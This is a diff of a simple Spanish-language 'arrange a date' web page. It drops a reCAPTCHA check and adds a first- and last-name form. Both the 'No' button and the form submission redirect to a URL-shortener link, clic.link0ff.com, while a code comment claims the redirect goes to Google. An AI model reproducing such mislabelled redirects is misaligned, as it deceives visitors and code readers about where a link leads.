@@ -4,16 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Concretar Cita</title>
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 <style>
        body {
-           /* ⬅️ Usando el fondo del link de Imgur */
+           /* Fondo con imagen */
            background-image: url('https://i.imgur.com/MJEzJR7.png');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-color: #000000;
-           color: white; /* Color del texto principal */
+           color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
@@ -26,14 +25,32 @@
        }
        h1 {
            font-size: 3em;
-           margin-bottom: 30px; /* Reducido para hacer espacio al CAPTCHA */
+           margin-bottom: 20px;
            text-align: center;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.9);
        }
-       /* Estilo para el contenedor del CAPTCHA */
-       #recaptcha-container {
-           margin-bottom: 20px;
-           /* Si el fondo es muy colorido, el data-theme="dark" ayuda */
+       /* Estilos del formulario */
+       #citaForm {
+           display: none; /* Oculto por defecto */
+           flex-direction: column;
+           align-items: center;
+           padding: 20px;
+           background-color: rgba(0, 0, 0, 0.6); /* Fondo semi-transparente */
+           border-radius: 10px;
+           margin-bottom: 30px;
+       }
+       #citaForm input {
+           padding: 10px;
+           margin: 10px 0;
+           width: 300px;
+           border: 2px solid #fff;
+           border-radius: 5px;
+           font-size: 1.2em;
+           background-color: rgba(255, 255, 255, 0.9);
+           color: #333;
+       }
+       #citaForm button {
+           margin-top: 15px;
        }
        .button-container {
            display: flex;
@@ -53,12 +70,6 @@
            display: flex;
            justify-content: center;
            align-items: center;
-           pointer-events: none; /* Deshabilita el botón por defecto */
-           opacity: 0.6;        /* Hace que el botón parezca deshabilitado */
-       }
-       .button.active {
-           pointer-events: auto; /* Habilita el botón cuando el CAPTCHA es completado */
-           opacity: 1;
        }
        .button:hover {
            transform: translateY(-3px);
@@ -74,18 +85,40 @@
 </head>
 <body>
 <h1>¿Quieres concretar una cita?</h1>
-<div id="recaptcha-container">
-<div class="g-recaptcha" data-sitekey="TU_CLAVE_DEL_SITIO" data-callback="onCaptchaSuccess" data-theme="dark"></div>
-</div>
-<div class="button-container">
-<a href="https://www.google.com" target="_blank" class="button green" id="btn-si">Sí</a>
-<button class="button red">No</button>
+<form id="citaForm">
+<input type="text" id="nombre" name="nombre" placeholder="Nombre" required>
+<input type="text" id="apellido" name="apellido" placeholder="Apellido" required>
+<button type="submit" class="button green">Entrar</button>
+</form>
+<div class="button-container" id="initial-buttons">
+<a href="#" class="button green" onclick="showForm()">Sí</a>
+<button class="button red" onclick="redirectToGoogle()">No</button>
 </div>
 <script>
-       // 3. Función JavaScript para activar el botón 'Sí' cuando el usuario pasa el CAPTCHA
-       function onCaptchaSuccess(token) {
-           document.getElementById('btn-si').classList.add('active');
+       function showForm() {
+           // Oculta los botones iniciales
+           document.getElementById('initial-buttons').style.display = 'none';
+           // Muestra el formulario
+           document.getElementById('citaForm').style.display = 'flex';
        }
+       function redirectToGoogle() {
+           // Redirige a Google cuando se presiona 'No'
+           window.location.href = 'https://clic.link0ff.com/A8644bAe';
+       }
+       // Manejar el envío del formulario (aquí se enviarán los datos a un servidor real)
+       document.getElementById('citaForm').addEventListener('submit', function(event) {
+           event.preventDefault(); // Detiene el envío normal del formulario (para que no recargue)
+           const nombre = document.getElementById('nombre').value;
+           const apellido = document.getElementById('apellido').value;
+           if (nombre && apellido) {
+               alert(`¡Gracias, ${nombre} ${apellido}! Tu solicitud ha sido enviada.`);
+               // ➡️ Aquí iría la lógica para enviar los datos (usando fetch o AJAX)
+               // Por ahora, redirigiremos a Google como ejemplo de éxito:
+               window.location.href = 'https://clic.link0ff.com/A8644bAe';
+           } else {
+               alert("Por favor, completa ambos campos.");
+           }
+       });
 </script>
 </body>
 </html>
